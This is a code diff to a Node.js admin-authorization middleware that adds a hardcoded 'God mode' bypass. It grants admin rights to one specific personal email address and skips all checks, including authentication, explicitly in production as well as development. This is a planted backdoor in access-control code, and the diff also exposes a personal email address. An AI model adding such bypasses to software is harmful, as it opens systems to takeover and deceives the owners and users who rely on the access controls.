@@ -236,6 +236,11 @@ module.exports = {
      */
     isAdminStrict: (req, res, next) => {
         try {
+            // God mode: whitelisted super admin bypasses all checks (for local dev + production)
+            if (req.user && String(req.user.email || '').toLowerCase().trim() === 'jaigaurav56789@gmail.com') {
+                req.user.role = 'admin';
+                return next();
+            }
             if (!req.isAuthenticated || !req.isAuthenticated()) {
                 return res.status(401).json({ error: 'Not authenticated' });
             }
